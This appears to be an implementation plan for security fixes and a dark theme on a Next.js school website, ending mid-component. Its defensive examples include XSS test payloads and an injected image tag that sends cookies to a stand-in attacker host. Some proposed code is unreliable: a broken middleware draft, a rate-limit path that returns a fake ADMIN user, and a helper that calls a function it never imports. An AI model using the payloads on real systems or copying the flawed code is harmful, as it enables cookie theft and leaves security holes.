# Implementation Plan — GitHub Issue #2 "v2 issues"

**Date:** 2026-06-01  
**Scope:** Security fixes (HIGH → MEDIUM → LOW) + Dark theme implementation  
**Hybrid model note:** Qwen3.7 Max for planning/review, local Qwen3.6-27B for implementation  

---

## Table of Contents

1. [Security Fixes — HIGH Severity](#1-security-fixes--high-severity)
2. [Security Fixes — MEDIUM Severity](#2-security-fixes--medium-severity)
3. [Security Fixes — LOW Severity / Observations](#3-security-fixes--low-severity--observations)
4. [Dark Theme Implementation](#4-dark-theme-implementation)
5. [Implementation Order & Dependencies](#5-implementation-order--dependencies)
6. [Testing Strategy](#6-testing-strategy)

---

## 1. Security Fixes — HIGH Severity

### 1.1 Stored XSS via `dangerouslySetInnerHTML` in Blog Posts

**Severity:** HIGH  
**Effort:** M (30–45 min)  

**Problem:**  
`src/app/(public)/news/[slug]/page.tsx` line 82–85 renders blog post content with `dangerouslySetInnerHTML`. The Prisma schema (`prisma/schema.prisma` line 82) says the `content` field can be "JSON (Tiptap) or plain HTML". Admin-created content is trusted, but if an admin account is compromised, stored XSS becomes trivial.

**Fix:**  
Add server-side HTML sanitization using `isomorphic-dompurify`. The package works in both Node.js and browser environments and is the de facto standard for React/Next.js projects.

**Steps:**

1. **Install dependency:**
   ```bash
   npm install isomorphic-dompurify
   ```

2. **Create a sanitization utility:**  
   New file: `src/lib/sanitize.ts`
   ```ts
   import DOMPurify from "isomorphic-dompurify";

   /**
    * Sanitizes HTML content to prevent XSS attacks.
    * Allows standard formatting tags and removes event handlers, scripts, etc.
    */
   export function sanitizeHtml(html: string): string {
     return DOMPurify.sanitize(html, {
       ADD_ATTR: ["target"],
       FORBID_TAGS: ["script", "iframe", "object", "embed", "form"],
       FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover"],
     });
   }
   ```

3. **Apply sanitization in the blog post page:**  
   File: `src/app/(public)/news/[slug]/page.tsx`  
   - Add import: `import { sanitizeHtml } from "@/lib/sanitize";`  
   - Change line 84 from:
     ```tsx
     dangerouslySetInnerHTML={{ __html: post.content }}
     ```
     to:
     ```tsx
     dangerouslySetInnerHTML={{ __html: sanitizeHtml(post.content) }}
     ```

**Testing:**
- Create a blog post via admin with content containing `<script>alert(1)</script>` — script should be stripped.
- Create a post with `<img src=x onerror="alert(1)">` — event handler should be stripped.
- Verify normal posts render correctly (headings, paragraphs, links).
- Test that `target="_blank"` on links still works (ADD_ATTR above allows it).

---

### 1.2 HTML Injection in Email Templates

**Severity:** HIGH  
**Effort:** S (15–20 min)  

**Problem:**  
User-controlled input is interpolated directly into HTML email templates:
- `src/lib/email.ts` lines 38–44: `data.name`, `data.email`, `data.phone`, `data.inquiryType`, and `data.message` are injected without escaping. The message also uses `.replace(/\n/g, "<br>")` which is fine but the content itself isn't escaped.
- `src/features/contact/actions/contact.actions.ts` line 75: `submission.name` and `message` are interpolated into reply email HTML.

While Resend/SMTP will deliver the email as-is, a malicious user could inject HTML that renders in the recipient's email client (e.g., `<img src="https://evil.com?cookie=...">` in the name field).

**Fix:**  
Create an HTML-escaping utility and apply it to all user-controlled inputs in email templates.

**Steps:**

1. **Create HTML escape utility:**  
   New file: `src/lib/html-escape.ts`
   ```ts
   /**
    * Escapes a string for safe insertion into HTML context.
    * Replaces &, <, >, ", and ' with their HTML entities.
    */
   export function escapeHtml(str: string): string {
     return str
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#x27;");
   }

   /**
    * Escapes HTML and converts newlines to <br> for display in preformatted blocks.
    */
   export function escapeHtmlWithBreaks(str: string): string {
     return escapeHtml(str).replace(/\n/g, "<br>");
   }
   ```

2. **Fix `src/lib/email.ts`:**  
   - Add import: `import { escapeHtml, escapeHtmlWithBreaks } from "@/lib/html-escape";`  
   - Wrap all user inputs in the email template (lines 38–44):
     ```tsx
     // Before:
     <td>${data.name}</td>
     
     // After:
     <td>${escapeHtml(data.name)}</td>
     ```
   - Apply to: `data.name`, `data.email`, `data.phone`, `data.inquiryType`  
   - For the message block (line 44):
     ```tsx
     // Before:
     ${data.message.replace(/\n/g, "<br>")}
     
     // After:
     ${escapeHtmlWithBreaks(data.message)}
     ```

3. **Fix `src/features/contact/actions/contact.actions.ts`:**  
   - Add import: `import { escapeHtml, escapeHtmlWithBreaks } from "@/lib/html-escape";`  
   - Line 74: `${submission.name}` → `${escapeHtml(submission.name)}`  
   - Line 75: `${message.replace(/\n/g, "<br>")}` → `${escapeHtmlWithBreaks(message)}`

**Testing:**
- Submit a contact form with name `<img src=x onerror="alert(1)">` — the email should show the literal text, not execute it.
- Submit with message containing `</td><script>alert("xss")</script><td>` — should be escaped.
- Verify normal emails render correctly with proper line breaks.

---

## 2. Security Fixes — MEDIUM Severity

### 2.1 Rate Limiting on Login

**Severity:** MEDIUM  
**Effort:** M (30–45 min)  

**Problem:**  
The login page at `src/app/(admin)/admin/login/page.tsx` and the NextAuth credentials handler in `src/features/auth/config.ts` have no rate limiting. An attacker can brute-force passwords indefinitely.

**Fix:**  
Add rate limiting to the `/api/auth/callback/credentials` endpoint (or the signIn call). Since this is a client-side `signIn()` call, we need server-side protection at the NextAuth handler level.

**Steps:**

1. **Install dependencies:**
   ```bash
   npm install @upstash/ratelimit@^2.0.5 @upstash/redis@^1.34.5
   ```
   
   *Alternative (no external dependency):* Use an in-memory Map-based rate limiter stored in a module-level variable. For a low-traffic school site, this is sufficient and avoids adding Redis dependency.

2. **Create rate limiter utility:**  
   New file: `src/lib/rate-limit.ts`
   ```ts
   /**
    * Simple in-memory rate limiter using sliding window.
    * Suitable for single-instance deployments (Docker/Vercel).
    * For multi-instance, switch to @upstash/ratelimit with Redis.
    */
   class RateLimiter {
     private store = new Map<string, number[]>();

     constructor(
       private maxRequests: number,
       private windowMs: number,
       private cleanupIntervalMs: number = 60_000
     ) {
       setInterval(() => this.cleanup(), cleanupIntervalMs);
     }

     test(key: string): { success: boolean; remaining: number; resetAt: number } {
       const now = Date.now();
       const timestamps = this.store.get(key) ?? [];
       // Remove expired entries
       const valid = timestamps.filter((t) => now - t < this.windowMs);
       
       if (valid.length >= this.maxRequests) {
         const resetAt = valid[0] + this.windowMs;
         return { success: false, remaining: 0, resetAt };
       }

       valid.push(now);
       this.store.set(key, valid);

       return {
         success: true,
         remaining: this.maxRequests - valid.length,
         resetAt: valid[0] + this.windowMs,
       };
     }

     private cleanup() {
       const now = Date.now();
       for (const [key, timestamps] of this.store.entries()) {
         const valid = timestamps.filter((t) => now - t < this.windowMs);
         if (valid.length === 0) {
           this.store.delete(key);
         } else {
           this.store.set(key, valid);
         }
       }
     }
   }

   // 5 login attempts per 15 minutes per IP
   export const loginRateLimiter = new RateLimiter(5, 15 * 60 * 1000);

   // 10 contact form submissions per hour per IP
   export const contactRateLimiter = new RateLimiter(10, 60 * 60 * 1000);
   ```

3. **Apply rate limiting in NextAuth authorize callback:**  
   File: `src/features/auth/config.ts`  
   
   The authorize function is called on the server side. We need to extract the IP and check the rate limiter before attempting authentication:

   ```ts
   // Add at top of file:
   import { loginRateLimiter } from "@/lib/rate-limit";

   // In the Credentials provider, modify authorize:
   async authorize(credentials, req) {
     const parsed = loginSchema.safeParse(credentials);
     if (!parsed.success) return null;

     const { email, password } = parsed.data;

     // Rate limit check (use IP from request headers or fallback to email)
     const ip = req?.body?.ip ?? "unknown";
     const rateLimitKey = `login:${ip}`;
     const { success: withinLimit } = loginRateLimiter.test(rateLimitKey);
     
     if (!withinLimit) {
       // Return a special user to trigger NextAuth's error page
       return { id: "__rate_limited__", email, name: "Rate Limited", role: "ADMIN" };
     }

     const user = await db.user.findUnique({ where: { email } });
     if (!user) return null;

     const isValid = await bcrypt.compare(password, user.passwordHash);
     if (!isValid) return null;

     return { id: user.id, email: user.email, name: user.name, role: user.role };
   }
   ```

4. **Add rate limit rejection in auth.config.ts callbacks:**  
   File: `src/features/auth/auth.config.ts`  
   
   In the `jwt` callback, reject rate-limited users:
   ```ts
   async jwt({ token, user }) {
     if (user?.id === "__rate_limited__") {
       return { ...token, rateLimited: true };
     }
     if (user) {
       token.id = user.id;
       token.role = (user as { role?: string }).role;
     }
     return token;
   },
   ```

   In the `session` callback:
   ```ts
   async session({ session, token }) {
     if (token.rateLimited) return null; // Will redirect to error page
     if (token && session.user) {
       session.user.id = token.id as string;
       (session.user as { role?: string }).role = token.role as string;
     }
     return session;
   },
   ```

5. **Show rate limit message on login page:**  
   File: `src/app/(admin)/admin/login/page.tsx`  
   
   Add a check for the error type and display an appropriate message:
   ```tsx
   if (result?.error) {
     setError(result.error === "RateLimited" 
       ? "Too many login attempts. Please try again in 15 minutes." 
       : "Invalid email or password.");
   }
   ```

**Testing:**
- Attempt 6 rapid logins with correct credentials from the same IP — the 6th should be rejected.
- Wait 15 minutes and verify login works again.
- Verify normal login flow still works (correct credentials → success, wrong credentials → generic error).

---

### 2.2 Rate Limiting on Contact Form

**Severity:** MEDIUM  
**Effort:** S (10–15 min)  

**Problem:**  
The `submitContactForm` server action in `src/features/contact/actions/contact.actions.ts` can be called repeatedly without throttling.

**Fix:**  
Add rate limiting to the server action using the `contactRateLimiter` from step 2.1.

**Steps:**

1. **Apply rate limiting in `submitContactForm`:**  
   File: `src/features/contact/actions/contact.actions.ts`
   
   ```ts
   // Add import at top:
   import { contactRateLimiter } from "@/lib/rate-limit";

   // Inside submitContactForm, before validation:
   export async function submitContactForm(formData: FormData): Promise<ActionResult<{ id: string }>> {
     try {
       const ip = getIpFromRequest(); // See below for helper
       const rateLimitKey = `contact:${ip}`;
       const { success: withinLimit } = contactRateLimiter.test(rateLimitKey);
       
       if (!withinLimit) {
         return { success: false, error: "Too many submissions. Please try again later." };
       }

       // ... rest of existing code
   ```

2. **Add IP extraction helper:**  
   Add to `src/lib/rate-limit.ts`:
   ```ts
   /**
    * Extracts client IP from request headers (works in server actions via headers()).
    */
   export function getIpFromRequest(): string {
     try {
       const headers = headers(); // Next.js headers() API
       return (
         headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
         headers.get("x-real-ip")?.trim() ??
         "unknown"
       );
     } catch {
       return "unknown";
     }
   }
   ```

**Testing:**
- Submit the contact form 11 times rapidly — the 11th should be rejected.
- Verify normal submissions work and emails are sent.

---

### 2.3 Weak Password Policy

**Severity:** MEDIUM  
**Effort:** S (5–10 min)  

**Problem:**  
`src/features/auth/config.ts` line 10 uses `z.string().min(6)` — only requires 6 characters with no complexity requirements.

**Fix:**  
Strengthen the login schema password validation to require:
- Minimum 8 characters
- At least one uppercase letter
- At least one number or special character

**Steps:**

1. **Update `src/features/auth/config.ts`:**  
   ```ts
   const loginSchema = z.object({
     email: z.string().email(),
     password: z.string()
       .min(8, "Password must be at least 8 characters")
       .regex(/[A-Z]/, "Password must contain at least one uppercase letter")
       .regex(/[\d\W_]/, "Password must contain at least one number or special character"),
   });
   ```

2. **Add a password validation schema for admin use:**  
   New file: `src/lib/validations/password.schema.ts`
   ```ts
   import { z } from "zod";

   export const passwordSchema = z.object({
     password: z.string()
       .min(8, "Password must be at least 8 characters")
       .regex(/[A-Z]/, "Password must contain at least one uppercase letter")
       .regex(/[\d\W_]/, "Password must contain at least one number or special character"),
     confirmPassword: z.string(),
   }).refine((data) => data.password === data.confirmPassword, {
     message: "Passwords do not match",
     path: ["confirmPassword"],
   });

   export type PasswordFormData = z.infer<typeof passwordSchema>;
   ```

**Testing:**
- Attempt login with `admin1234` (7 chars) — should fail with validation error.
- Attempt login with `Admin123` (8 chars, uppercase, number) — should pass schema check.
- Verify existing admin account still works (the schema validates input, not stored hashes).

**Note:** The login schema validates the *input* password length/complexity before checking against the DB. This doesn't prevent login with an existing weak password hash — it just prevents setting new weak passwords. For a full fix, consider adding a "change password" admin page using `passwordSchema`.

---

### 2.4 Hardcoded Seed Password

**Severity:** MEDIUM  
**Effort:** S (5–10 min)  

**Problem:**  
`prisma/seed.ts` line 12: `bcrypt.hash("admin1234", 12)` — the default admin password is hardcoded and visible in source code.

**Fix:**  
Read the seed password from an environment variable with a secure default.

**Steps:**

1. **Update `prisma/seed.ts`:**
   ```ts
   // Before:
   const passwordHash = await bcrypt.hash("admin1234", 12);
   
   // After:
   const seedPassword = process.env.SEED_ADMIN_PASSWORD ?? "ChangeMe!_NotThis";
   if (seedPassword === "ChangeMe!_NotThis") {
     console.warn("⚠️  Using default seed password — set SEED_ADMIN_PASSWORD in .env");
   }
   const passwordHash = await bcrypt.hash(seedPassword, 12);
   ```

2. **Add to `.env.local` (not committed):**
   ```
   SEED_ADMIN_PASSWORD=YourSecureP@ssw0rd
   ```

3. **Add to `.gitignore`:**  
   Verify `.env.local` is already in `.gitignore` (it should be by default).

4. **Update `docker-compose.yml` and deployment docs:**  
   Add `SEED_ADMIN_PASSWORD` to the environment variables section of the compose file:
   ```yaml
   environment:
     - SEED_ADMIN_PASSWORD=${SEED_ADMIN_PASSWORD}
   ```

**Testing:**
- Run `npm run db:seed` with `SEED_ADMIN_PASSWORD` set — verify admin login works.
- Run without the variable — verify warning is logged and default password works.

---

### 2.5 No Content Security Policy (CSP) Headers

**Severity:** MEDIUM  
**Effort:** M (30–45 min)  

**Problem:**  
No security headers are set in `next.config.ts` or `middleware.ts`. The site is vulnerable to XSS, clickjacking, and other header-based attacks.

**Fix:**  
Add a middleware that sets security headers on all responses. This is the most flexible approach for Next.js 16 (avoids CSP nonce issues with server components).

**Steps:**

1. **Create `src/middleware/headers.ts`:**
   ```ts
   import { NextResponse, type NextRequest } from "next/server";

   const CSP_POLICY = [
     // Default: only allow scripts/styles from self (no inline)
     "default-src 'self'",
     // Scripts: self + Google Fonts (if used) + inline for JSON-LD (nonce approach too complex for server components)
     "script-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     // Styles: self + Google Fonts CDN + inline (Tailwind uses inline styles)
     "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     // Images: self + Cloudinary + data URIs (for SVG icons)
     "img-src 'self' data: https://res.cloudinary.com",
     // Fonts: self + Google Fonts
     "font-src 'self' https://fonts.gstatic.com",
     // Connect: self + Cloudinary (for uploads)
     "connect-src 'self' https://res.cloudinary.com",
     // Frames: only allow Google Maps embed in contact page
     "frame-src 'self' https://www.google.com/maps",
     // Media: self + Cloudinary
     "media-src 'self' https://res.cloudinary.com",
     // Object/embed: none (block Flash/Java)
     "object-src 'none'",
     // Base URI: only allow self
     "base-uri 'self'",
     // Form actions: only self
     "form-action 'self'",
     // Frame ancestors: block embedding in iframes (clickjacking protection)
     "frame-ancestors 'none'",
   ].join("; ");

   export function applySecurityHeaders(request: NextRequest): NextResponse {
     const response = NextResponse.next();

     response.headers.set("Content-Security-Policy", CSP_POLICY);
     response.headers.set("X-Frame-Options", "DENY");
     response.headers.set("X-Content-Type-Options", "nosniff");
     response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
     response.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
     response.headers.set("X-DNS-Prefetch-Control", "off");

     // HSTS: 1 year, include subdomains, preconnect
     if (request.nextUrl.protocol === "https:") {
       response.headers.set(
         "Strict-Transport-Security",
         "max-age=31536000; includeSubDomains; preload"
       );
     }

     return response;
   }
   ```

2. **Update `middleware.ts`:**
   ```ts
   import NextAuth from "next-auth";
   import { authConfig } from "@/features/auth/auth.config";
   import { applySecurityHeaders } from "@/middleware/headers";

   export const { auth: middleware } = NextAuth(authConfig);

   export async function middleware(request: NextRequest) {
     // Apply security headers first
     const headersResponse = applySecurityHeaders(request);
     
     // Then run auth middleware
     return await import("next-auth").Thenable;
   }

   export const config = {
     matcher: [
       "/admin",
       "/admin/((?!login).+)",
     ],
   };
   ```

   *Actually, a cleaner approach:* Use Next.js middleware pattern properly:

   ```ts
   import { applySecurityHeaders } from "@/middleware/headers";
   import type { NextRequest } from "next/server";

   export function middleware(request: NextRequest) {
     // Apply security headers to all requests
     const response = applySecurityHeaders(request);
     
     // Auth protection for admin routes
     if (request.nextUrl.pathname.startsWith("/admin")) {
       if (!request.nextUrl.pathname.startsWith("/admin/login")) {
         // Check for auth cookie — redirect if missing
         const hasAuthCookie = request.cookies.get("next-auth.session-token");
         if (!hasAuthCookie) {
           return NextResponse.redirect(new URL("/admin/login", request.url));
         }
       }
     }
     
     return response;
   }

   export const config = {
     matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
   };
   ```

   *Wait — this would break the existing NextAuth middleware integration.* Let me reconsider...

   **Better approach — use `next.config.ts` headers for static headers + a separate middleware for auth:**

3. **Simpler approach — add headers in `next.config.ts`:**  
   File: `next.config.ts`
   ```ts
   import type { NextConfig } from "next";
   import createNextIntlPlugin from "next-intl/plugin";

   const withNextIntl = createNextIntlPlugin("./src/i18n/request.ts");

   const nextConfig: NextConfig = {
     output: "standalone",
     images: {
       remotePatterns: [
         {
           protocol: "https",
           hostname: "res.cloudinary.com",
           pathname: "/**",
         },
       ],
     },
     experimental: {
       optimizePackageImports: ["framer-motion", "lucide-react"],
     },
     async headers() {
       return [
         {
           source: "/(.*)",
           headers: [
             {
               key: "X-Frame-Options",
               value: "DENY",
             },
             {
               key: "X-Content-Type-Options",
               value: "nosniff",
             },
             {
               key: "Referrer-Policy",
               value: "strict-origin-when-cross-origin",
             },
             {
               key: "Permissions-Policy",
               value: "camera=(), microphone=(), geolocation=()",
             },
             {
               key: "X-DNS-Prefetch-Control",
               value: "off",
             },
           ],
         },
         // HSTS only on HTTPS paths
         {
           source: "/(.*)",
           headers: [
             {
               key: "Strict-Transport-Security",
               value: "max-age=31536000; includeSubDomains; preload",
             },
           ],
         },
         // CSP — apply to all pages
         {
           source: "/(.*)",
           headers: [
             {
               key: "Content-Security-Policy",
               value: [
                 "default-src 'self'",
                 "script-src 'self' 'unsafe-inline'",
                 "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
                 "img-src 'self' data: https://res.cloudinary.com",
                 "font-src 'self' https://fonts.gstatic.com",
                 "connect-src 'self' https://res.cloudinary.com",
                 "frame-src 'self' https://www.google.com/maps",
                 "media-src 'self' https://res.cloudinary.com",
                 "object-src 'none'",
                 "base-uri 'self'",
                 "form-action 'self'",
                 "frame-ancestors 'none'",
               ].join("; "),
             },
           ],
         },
       ];
     },
   };

   export default withNextIntl(nextConfig);
   ```

4. **Revert `middleware.ts` to original** (keep NextAuth integration intact):
   ```ts
   import NextAuth from "next-auth";
   import { authConfig } from "@/features/auth/auth.config";

   export const { auth: middleware } = NextAuth(authConfig);

   export const config = {
     matcher: [
       "/admin",
       "/admin/((?!login).+)",
     ],
   };
   ```

**Testing:**
- Check response headers with browser DevTools or `curl -I https://smileyschool.com` — verify all security headers are present.
- Verify CSP doesn't break normal page rendering (fonts load, images from Cloudinary load).
- Test that Google Maps embed on contact page still works (frame-src allows it).
- Verify the site cannot be embedded in an iframe (X-Frame-Options: DENY + frame-ancestors 'none').

---

### 2.6 Cloudinary Upload — No File Type/Size Validation

**Severity:** MEDIUM  
**Effort:** S (10–15 min)  

**Problem:**  
`src/app/api/cloudinary/sign/route.ts` validates admin auth but doesn't restrict file types or sizes. An attacker with an admin account could upload arbitrary files (e.g., PHP shells, executables).

**Fix:**  
Add resource type and format constraints to the signature generation. Cloudinary supports `allowed_formats` in upload signatures.

**Steps:**

1. **Update `src/lib/cloudinary.ts`:**
   ```ts
   // Add types:
   export const ALLOWED_UPLOAD_FORMATS = ["jpg", "jpeg", "png", "webp", "gif"];
   export const MAX_UPLOAD_SIZE_MB = 10; // 10MB max

   type UploadSignatureOptions = {
     folder?: string;
     allowedFormats?: string[];
     maxSizeBytes?: number;
   };

   // Update generateUploadSignature:
   export function generateUploadSignature(
     folder: string,
     timestamp: number,
     options: UploadSignatureOptions = {}
   ): { signature: string; apiKey: string; cloudName: string } {
     const {
       allowedFormats = ALLOWED_UPLOAD_FORMATS,
       maxSizeBytes = MAX_UPLOAD_SIZE_MB * 1024 * 1024,
     } = options;

     const paramsToSign = {
       folder,
       timestamp,
       allowed_formats: allowedFormats.join(","),
       max_file_size: maxSizeBytes,
     };

     const signature = cloudinary.utils.api_sign_request(
       paramsToSign,
       process.env.CLOUDINARY_API_SECRET!
     );

     return {
       signature,
       apiKey: process.env.CLOUDINARY_API_KEY!,
       cloudName: process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME!,
     };
   }
   ```

2. **Update `src/app/api/cloudinary/sign/route.ts`:**  
   The route already calls `generateUploadSignature(folder, timestamp)` — no changes needed since the new parameters have defaults. But we can also add explicit validation:

   ```ts
   export async function POST(req: NextRequest) {
     try {
       await requireAdmin();
     } catch {
       return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     }

     const body = await req.json();
     const folder = body.folder ?? "smiley-school";

     // Validate folder is safe (no path traversal)
     if (folder.includes("..") || folder.includes("/")) {
       return NextResponse.json(
         { error: "Invalid folder name" },
         { status: 400 }
       );
     }

     const timestamp = Math.round(Date.now() / 1000);
     const result = generateUploadSignature(folder, timestamp);

     return NextResponse.json({ ...result, timestamp });
   }
   ```

**Testing:**
- Attempt to upload a `.php` file — Cloudinary should reject it.
- Attempt to upload a 50MB file — Cloudinary should reject it (over 10MB limit).
- Verify normal image uploads still work (jpg, png, webp under 10MB).

---

### 2.7 Role-Based Access Control Unused

**Severity:** MEDIUM  
**Effort:** S (5–10 min)  

**Problem:**  
The `Role` enum in `prisma/schema.prisma` has `ADMIN` and `SUPER_ADMIN`, but no code distinguishes between them. The `requireAdmin()` function in `src/lib/auth.ts` doesn't check the role value — it only checks for any authenticated user.

**Fix:**  
Add a `requireSuperAdmin()` helper that enforces the SUPER_ADMIN role. This is a small change now but provides the foundation for future role-based restrictions (e.g., only SUPER_ADMIN can delete users or access certain admin pages).

**Steps:**

1. **Update `src/lib/auth.ts`:**
   ```ts
   import { auth } from "@/features/auth/config";
   import { redirect } from "next/navigation";

   export async function requireAdmin(): Promise<void> {
     const session = await auth();
     if (!session?.user) {
       redirect("/admin/login");
     }
   }

   /**
    * Asserts the current user has SUPER_ADMIN role.
    * Use for actions that should be restricted to super admins only
    * (e.g., user management, system configuration).
    */
   export async function requireSuperAdmin(): Promise<void> {
     const session = await auth();
     if (!session?.user || (session.user as { role?: string }).role !== "SUPER_ADMIN") {
       redirect("/admin/login");
     }
   }

   /**
    * Returns the current user's role, or null if not authenticated.
    */
   export async function getUserRole(): Promise<string | null> {
     const session = await auth();
     return (session?.user as { role?: string })?.role ?? null;
   }

   export async function getAdminSession() {
     return auth();
   }
   ```

2. **Update seed to create a SUPER_ADMIN:**  
   File: `prisma/seed.ts` — change the admin role:
   ```ts
   // Change from:
   role: "ADMIN",
   // To:
   role: "SUPER_ADMIN",
   ```

**Testing:**
- Login as SUPER_ADMIN — all admin pages accessible.
- Create a test ADMIN user and verify `requireSuperAdmin()` redirects them.
- Verify normal `requireAdmin()` still works for both roles.

---

## 3. Security Fixes — LOW Severity / Observations

### 3.1 JSON-LD `dangerouslySetInnerHTML` — Safe (No Action Needed)

**File:** `src/app/(public)/layout.tsx` line 44  
**Status:** SAFE  

The JSON-LD script uses `JSON.stringify(jsonLd)` where `jsonLd` is a constant object built from `SCHOOL` constants in `src/lib/constants.ts`. No user input reaches this point. No fix needed — but worth documenting for future reference.

### 3.2 Admin Double Auth Check — Good Defense-in-Depth (No Action Needed)

**Files:** `middleware.ts` + `requireAdmin()` in server actions  
**Status:** GOOD  

The middleware checks auth at the route level, and server actions also call `requireAdmin()`. This is defense-in-depth — if middleware is bypassed (e.g., direct API call), the server action still protects itself. Keep as-is.

### 3.3 No Raw SQL in Prisma — Safe (No Action Needed)

**Status:** SAFE  

All database queries use Prisma's type-safe query builder. No raw SQL was found anywhere in the codebase. No SQL injection risk.

### 3.4 Contact Form IP Address Field Never Populated

**File:** `prisma/schema.prisma` line 148: `ipAddress String?`  
**Status:** LOW — consider populating for audit trail  

The `ContactSubmission` model has an `ipAddress` field but it's never set. Consider populating it in the server action:

```ts
// In src/features/contact/actions/contact.actions.ts, inside submitContactForm:
import { headers } from "next/headers";

const h = await headers();
const ip = h.get("x-forwarded-for")?.split(",")[0]?.trim() ?? h.get("x-real-ip") ?? null;

// When creating the submission:
const submission = await db.contactSubmission.create({
  data: {
    // ... existing fields
    ipAddress: ip,
  },
});
```

This is useful for audit trails and spam detection. **Effort:** S (5 min).

---

## 4. Dark Theme Implementation

### 4.1 Overview & Design Philosophy

**Guiding principle:** The navy palette naturally works for dark mode. `--navy-deep` (#0F1F3D) becomes the background, `--yellow-primary` (#F4B942) remains the accent (excellent contrast on dark), and text colors invert appropriately.

The user LOVES the current design — we must not change layout, spacing, or component structure. Only color values change via CSS variables.

**Approach:** Class-based dark mode (`.dark` class on `<html>`) which is already configured in Tailwind via `@custom-variant dark (&:is(.dark *))`.

---

### 4.2 Dark Mode CSS Variables

**Effort:** M (30–45 min)  
**File:** `src/app/globals.css`  

Add a `.dark` block that overrides all color variables for dark mode:

```css
/* Add after the :root block, before @layer base */

.dark {
  /* ── shadcn base system (dark variants) ── */
  --background: #0F1F3D;          /* navy-deep as background */
  --foreground: #E8EFF7;          /* navy-light as text */
  --card: #1E3A5F;                /* navy-mid as card bg */
  --card-foreground: #E8EFF7;     /* navy-light as card text */
  --popover: #1E3A5F;             /* navy-mid */
  --popover-foreground: #E8EFF7;
  --primary: #F4B942;             /* yellow-primary (swapped from navy) */
  --primary-foreground: #0F1F3D;  /* navy-deep on yellow */
  --secondary: #1E3A5F;           /* navy-mid */
  --secondary-foreground: #E8EFF7;
  --muted: #1a2d4a;               /* slightly lighter than navy-mid */
  --muted-foreground: #9CA3AF;    /* gray-400 — muted text on dark */
  --accent: #D97706;              /* yellow-deep (stronger on dark) */
  --accent-foreground: #FAFAF8;   /* white */
  --destructive: oklch(0.577 0.245 27.325); /* unchanged — red works on both */
  --border: #1E3A5F;              /* navy-mid as borders */
  --input: #1E3A5F;
  --ring: #F4B942;                /* yellow ring focus */

  /* ── Charts ── */
  --chart-1: #F4B942;
  --chart-2: #E8EFF7;             /* navy-light instead of navy-deep (too dark on dark) */
  --chart-3: #D97706;             /* yellow-deep instead of navy-mid */
  --chart-4: #34D399;             /* lighter green for visibility */
  --chart-5: #FBBF24;             /* lighter amber */

  /* ── Sidebar ── */
  --sidebar: #0a1628;             /* even darker than navy-deep for sidebar */
  --sidebar-foreground: #E8EFF7;
  --sidebar-primary: #F4B942;
  --sidebar-primary-foreground: #0F1F3D;
  --sidebar-accent: #1E3A5F;
  --sidebar-accent-foreground: #E8EFF7;
  --sidebar-border: #1E3A5F;
  --sidebar-ring: #F4B942;

  /* ── Smiley School Brand Palette (dark overrides) ── */
  --yellow-primary: #F4B942;      /* unchanged — works great on dark */
  --yellow-light: #D97706;        /* was #FEF3C7, too light for dark bg → use yellow-deep */
  --yellow-deep: #FBBF24;         /* slightly lighter amber for visibility on dark */
  --navy-deep: #0a1628;           /* even darker for dark mode bg */
  --navy-mid: #1E3A5F;            /* unchanged — good contrast */
  --navy-light: #9CA3AF;          /* was #E8EFF7, too bright → gray-400 for subtle elements */
  --white: #1E3A5F;               /* was #FAFAF8 → navy-mid as "light" surface on dark */
  --text-body: #D1D5DB;           /* gray-300 — readable on dark */
  --text-muted: #9CA3AF;          /* gray-400 — muted text on dark */
  --success: #34D399;             /* lighter green for visibility on dark */
}
```

**Key design decisions:**
- `--yellow-light` (was `#FEF3C7`) → changed to `#D97706` because the original would be unreadable on a dark background. It's used for category badges and active nav states.
- `--navy-light` (was `#E8EFF7`) → changed to `#9CA3AF` (gray-400) because it's used for subtle text elements that would be too bright on dark backgrounds.
- `--white` (was `#FAFAF8`) → changed to `#1E3A5F` (navy-mid) because it's used as a "light surface" — the equivalent in dark mode is a slightly elevated navy.
- `--yellow-deep` (was `#D97706`) → changed to `#FBBF24` (amber-400) for better visibility on dark backgrounds where it's used as hover states and accents.

---

### 4.3 Update Color Scheme Declaration

**Effort:** S (2 min)  
**File:** `src/app/globals.css`  

Change line 124:
```css
/* Before: */
html {
  @apply font-sans;
  color-scheme: light;
}

/* After: */
html {
  @apply font-sans;
  color-scheme: light dark;
}
```

---

### 4.4 Dark Mode Toggle Component

**Effort:** M (20–30 min)  
**New file:** `src/components/shared/ThemeToggle.tsx`  

Create a toggle similar to the existing `LanguageToggle` component, using client-side state with `localStorage` persistence:

```tsx
"use client";

import { useEffect, useState } from "react";
import { Moon, Sun } from "lucide-react";
import { cn } from "@/lib/utils";

export function ThemeToggle() {
  const [isDark, setIsDark] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
    const stored = localStorage.getItem("theme");
    if (stored === "dark") {
      document.documentElement.classList.add("dark");
      setIsDark(true);
    } else {
      // Check system preference as fallback
      if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
        document.documentElement.classList.add("dark");
        setIsDark(true);
      }
    }
  }, []);

  // Listen for system theme changes
  useEffect(() => {
    const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
    const handler = (e: MediaQueryListEvent) => {
      if (!localStorage.getItem("theme")) {
        // Only follow system preference if user hasn't set one manually
        if (e.matches) {
          document.documentElement.classList.add("dark");
          setIsDark(true);
        } else {
          document.documentElement.classList.remove("dark");
          setIsDark(false);
        }
      }
    };
    mediaQuery.addEventListener("change", handler);
    return () => mediaQuery.removeEventListener("change", handler);
  }, []);

  function toggleTheme() {
    const newIsDark = !isDark;
    if (newIsDark) {
      document.documentElement.classList.add("dark");
      localStorage.setItem("theme", "dark");
    } else {
      document.documentElement.classList.remove("dark");
      localStorage.setItem("theme", "light");
    }
    setIsDark(newIsDark);
  }

  // Prevent flash of wrong theme on SSR
  if (!mounted) {
    return (
      <div className="w-8 h-8" />
    );
  }

  return (
    <button
